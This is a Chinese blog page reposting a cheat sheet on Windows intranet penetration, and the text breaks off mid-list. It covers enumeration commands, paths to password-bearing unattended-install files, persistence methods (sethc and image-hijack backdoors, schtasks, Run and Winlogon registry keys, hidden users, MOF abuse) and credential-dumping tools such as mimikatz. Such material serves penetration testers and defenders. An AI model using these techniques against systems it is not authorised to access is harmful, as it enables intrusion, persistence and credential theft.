

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="ZERO">
  <meta name="keywords" content="">
  
    <meta name="description" content="原文地址：传送门 Windows内网渗透信息收集基本命令查看主机名： 1hostname  查询所有计算机名称： 1dsquery computer  查看配置以及相关补丁信息： 123systeminfowmic qfe get description,installedOn &#x2F;format:csv  查看系统版本： 1var  查看进程信息： 12345tasklist &#x2F;svcwmic pr">
<meta property="og:type" content="article">
<meta property="og:title" content="不同环境下内网渗透的相关技巧">
<meta property="og:url" content="http://example.com/2024/06/17/command1/index.html">
<meta property="og:site_name" content="ZERO&#39;s Blog">
<meta property="og:description" content="原文地址：传送门 Windows内网渗透信息收集基本命令查看主机名： 1hostname  查询所有计算机名称： 1dsquery computer  查看配置以及相关补丁信息： 123systeminfowmic qfe get description,installedOn &#x2F;format:csv  查看系统版本： 1var  查看进程信息： 12345tasklist &#x2F;svcwmic pr">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/example.jpg">
<meta property="article:published_time" content="2024-06-17T00:29:11.000Z">
<meta property="article:modified_time" content="2024-06-18T12:05:51.821Z">
<meta property="article:author" content="ZERO">
<meta property="article:tag" content="内网渗透">
<meta property="article:tag" content="信息收集">
<meta property="article:tag" content="相关指令">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/example.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>不同环境下内网渗透的相关技巧 - ZERO&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-C16YBJWRLK"},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-C16YBJWRLK", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', 'G-C16YBJWRLK');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ZERO&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/example1.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="不同环境下内网渗透的相关技巧"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-17 08:29" pubdate>
          2024年6月17日 早上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          8.2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          69 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">不同环境下内网渗透的相关技巧</h1>
            
            
              <div class="markdown-body">
                
                <p><strong>原文地址：</strong><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/intranet/index.html">传送门</a></p>
<h1 id="Windows内网渗透"><a href="#Windows内网渗透" class="headerlink" title="Windows内网渗透"></a>Windows内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>查看主机名：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hostname<br></code></pre></td></tr></table></figure>

<p>查询所有计算机名称：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dsquery computer<br></code></pre></td></tr></table></figure>

<p>查看配置以及相关补丁信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systeminfo<br><br>wmic qfe get description,installedOn /format:csv<br></code></pre></td></tr></table></figure>

<p>查看系统版本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">var<br></code></pre></td></tr></table></figure>

<p>查看进程信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">tasklist /svc<br><br>wmic process get caption,executablepath,commandline /format:csv<br><br>get-process  //powershell运行<br></code></pre></td></tr></table></figure>

<p>查看所有环境变量：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">set<br></code></pre></td></tr></table></figure>

<p>查看计划任务：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">schtasks /QUERY /fo LIST /v<br></code></pre></td></tr></table></figure>

<p>查看安装驱动：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">DRIVERQUERY<br></code></pre></td></tr></table></figure>

<p>查看操作系统信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic os get osarchitecture //架构<br>wmic os get caption //系统名<br></code></pre></td></tr></table></figure>

<p>查看逻辑盘：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic logicaldisk get caption<br></code></pre></td></tr></table></figure>

<p>查看安装的软件信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic product get name,version<br></code></pre></td></tr></table></figure>

<h3 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h3><p>获取当前组的计算机名：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span><br></code></pre></td></tr></table></figure>

<p>网络发现：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>

<p>查看所有域：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure>

<p>域信任信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nltest time /domain<br></code></pre></td></tr></table></figure>

<p>定位域控：</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure>

<p>查看域中的用户名：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>

<p>查询域组名称：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group /domain<br></code></pre></td></tr></table></figure>

<p>查询域管理员：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure>

<p>域控信息：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nltest /dclist:xx<br><br><span class="hljs-keyword">Get</span>-NetDomain<br><br><span class="hljs-keyword">Get</span>-NetDomainController<br><br>net <span class="hljs-keyword">group</span> &quot;Domain controllers&quot;<br></code></pre></td></tr></table></figure>

<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>查看用户：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user<br>whoami    whoami /priv    whoami /all<br>wmic useraccount get /ALL /format:csv<br></code></pre></td></tr></table></figure>

<p>用户特权信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure>

<p>查看当前权限：</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure>

<p>查看在线用户：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">quser   qwinsta   query <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>

<p>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">net config Workstation<br></code></pre></td></tr></table></figure>

<p>ACL信息：</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">get</span>-acl<br></code></pre></td></tr></table></figure>

<h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><p>网卡信息：</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span><br></code></pre></td></tr></table></figure>

<p>ARP表：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure>

<p>路由表：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">route print<br></code></pre></td></tr></table></figure>

<p>监听的端口：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure>

<p>端口信息：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-NetTCPConnection</span><br></code></pre></td></tr></table></figure>

<p>DNS缓存：</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">ipconfig /displaydns<br><br><span class="hljs-built_in">Get</span>-CimInstance -Namespace root/StandardCimv2 -<span class="hljs-built_in">ClassName</span> MSFT_DNSClientCache<br></code></pre></td></tr></table></figure>

<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>查看防火墙状态：</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">netsh advfirewall <span class="hljs-keyword">show</span> allprofiles<br></code></pre></td></tr></table></figure>

<p>防火墙日志目录：</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">netsh firewall <span class="hljs-keyword">show</span> logging<br></code></pre></td></tr></table></figure>

<p>防火墙规则：</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall firewall show <span class="hljs-keyword">rule</span> name=<span class="hljs-literal">all</span><br>netsh firewall show config<br>netsh firewall show <span class="hljs-keyword">state</span><br></code></pre></td></tr></table></figure>

<h3 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h3><p>无人值守安装文件中的密码信息：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">C:\sysprep.<span class="hljs-literal">inf</span><br>C:\sysprep\sysprep.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend\Unattended.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattended.xml<br></code></pre></td></tr></table></figure>

<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>创建系统隐藏文件：</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">attrib</span> +s +a +r +h <span class="hljs-keyword">filename</span> <br><span class="hljs-keyword">attrib</span> +s +h <span class="hljs-keyword">filename</span><br></code></pre></td></tr></table></figure>

<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="sethc"><a href="#sethc" class="headerlink" title="sethc"></a>sethc</h4><p><code>sethc.exe</code> 是 Windows系统在用户按下五次shift后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 <code>sethc.exe</code> 的方式留下后门，在密码输入页面输入五次shift即可获得权限</p>
<h4 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h4><p>在高版本的Windows中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p>
<p>具体操作为在注册表的 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</code> 下添加项 <code>sethc.exe</code> ，然后在 <code>sethc.exe</code> 这个项中添加 <code>debugger</code> 键，键值为恶意程序的路径</p>
<h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>Windows下有 <code>schtasks</code> 和 <code>at</code> 两种计划任务机制。 其中 <code>at</code> 在较高版本的Windows中已经弃用。</p>
<p>设置命令为 <code>schtasks /create /tn &quot;TEST_OnLogon&quot; /sc onlogon /tr &quot;cmd.exe /c calc.exe&quot;</code> 、 <code>schtasks /create /tn &quot;TEST_OnStartup&quot; /sc onstart /ru system /tr &quot;cmd.exe /c calc.exe&quot;</code> 。删除命令为 <code>schtasks /delete /tn &quot;TEST_OnLogon&quot; /f</code></p>
<h4 id="登录脚本"><a href="#登录脚本" class="headerlink" title="登录脚本"></a>登录脚本</h4><p>Windows可以在用户登录前执行脚本，使用 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 设置。</p>
<p>也可在 <code>HKCU\Environment\</code> 路径下设置 <code>UserInitMprLogonScript</code> 来实现</p>
<h4 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h4><p>Windows可以自定义屏幕保护程序，使用 <code>HKEY_CURRENT_USER\Control Panel\Desktop</code> 设置</p>
<h4 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h4><p>Windows可以使用在用户名后加入 <code>$</code> 来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。</p>
<p>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看</p>
<h4 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h4><p>CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET产品构建的运行环境，可以粗略地理解为.NET虚拟机。</p>
<p>.NET程序的运行离不开CLR，因此可以通过劫持CLR的方式实现后门</p>
<h4 id="Winlogon-Helper-DLL后门"><a href="#Winlogon-Helper-DLL后门" class="headerlink" title="Winlogon Helper DLL后门"></a>Winlogon Helper DLL后门</h4><p>Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在Windows登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。</p>
<p>注册表位置如下：</p>
<ul>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> 用于执行exe程序</li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 用于执行exe程序</li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</code> 用于执行dll文件</li>
</ul>
<h2 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h2><h4 id="基于注册表的自启动"><a href="#基于注册表的自启动" class="headerlink" title="基于注册表的自启动"></a>基于注册表的自启动</h4><p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 <code>Run</code> 和 <code>RunOnce</code> ，其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。</p>
<p>注册表如下：</p>
<ul>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code></li>
</ul>
<p>基于策略的自启动注册表设置如下：</p>
<ul>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></li>
</ul>
<p>设置启动文件夹注册表位置如下：</p>
<ul>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li>
</ul>
<p>设置服务启动项注册表位置如下：</p>
<ul>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li>
</ul>
<p>用户自启动位置 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 、 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> ，其中 <code>Userinit</code> 键允许指定用逗号分隔的多个程序。</p>
<p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：</p>
<ul>
<li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</code></li>
<li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</code></li>
<li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</code></li>
<li><code>HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</code></li>
</ul>
<h4 id="基于特定目录的自启动"><a href="#基于特定目录的自启动" class="headerlink" title="基于特定目录的自启动"></a>基于特定目录的自启动</h4><p>自启动目录， <code>C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> 目录对特定用户生效， <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 对所有用户生效。在NT6以前，两个目录为 <code>C:\Documents and Settings\Username\Start Menu\Programs\StartUp</code> &#x2F; <code>C:\Documents and Settings\All Users\Start Menu\Programs\StartUp</code></p>
<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>UAC (User Account Control) 是Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。</p>
<p>当用户登陆Windows时，每个用户都会被授予一个access token，这个token中有security identifier (SID) 的信息，决定了用户的权限</p>
<h4 id="会触发UAC的操作"><a href="#会触发UAC的操作" class="headerlink" title="会触发UAC的操作"></a>会触发UAC的操作</h4><ul>
<li>以管理员权限启动应用</li>
<li>修改系统、UAC设置</li>
<li>修改没有权限的文件或者目录（ %SystemRoot% &#x2F; %ProgramFiles% 等 ）</li>
<li>修改ACL (access control list)</li>
<li>安装驱动</li>
<li>增删账户，修改账户类型，激活来宾账户</li>
</ul>
<h4 id="ByPass"><a href="#ByPass" class="headerlink" title="ByPass"></a>ByPass</h4><ul>
<li>DLL相关</li>
<li>进程注入</li>
<li>注册表</li>
</ul>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或者其他类似的漏洞，以获得较高的权限。</p>
<p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p>
<h4 id="任意写文件利用"><a href="#任意写文件利用" class="headerlink" title="任意写文件利用"></a>任意写文件利用</h4><p>在Windows中用户可以写的敏感位置主要有以下这些</p>
<ul>
<li>用户自身的文件和目录，包括 <code>AppData</code> <code>Temp</code></li>
<li><code>C:\</code> ，默认情况下用户可以写入</li>
<li><code>C:\ProgramData</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li>
<li><code>C:\Windows\Temp</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li>
</ul>
<p>具体的ACL信息可用AccessChk, 或者PowerShell的 <code>Get-Acl</code> 命令查看。</p>
<p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限</p>
<h4 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h4><p>MOF是Windows系统的一个文件（ <code>c:/windows/system32/wbem/mof/nullevt.mof</code> ）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。</p>
<p>当拥有文件上传的权限但是没有Shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。</p>
<p>一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户</p>
<h4 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h4><p>Windows本地密码散列导出工具</p>
<ul>
<li>mimikatz</li>
<li>lsass</li>
<li>wce</li>
<li>gsecdump</li>
<li>copypwd</li>
<li>Pwdump</li>
<li>ProcDump</li>
</ul>
<p>Windows本地密码破解工具</p>
<ul>
<li><p>L0phtCrack</p>
</li>
<li><p>SAMInside</p>
</li>
<li><p>Ophcrack</p>
</li>
<li><p>彩虹表破解</p>
</li>
<li><p>本机hash+明文抓取</p>
</li>
<li><p>win8+win2012明文抓取</p>
</li>
<li><p>ntds.dit的导出+QuarkPwDump读取分析</p>
</li>
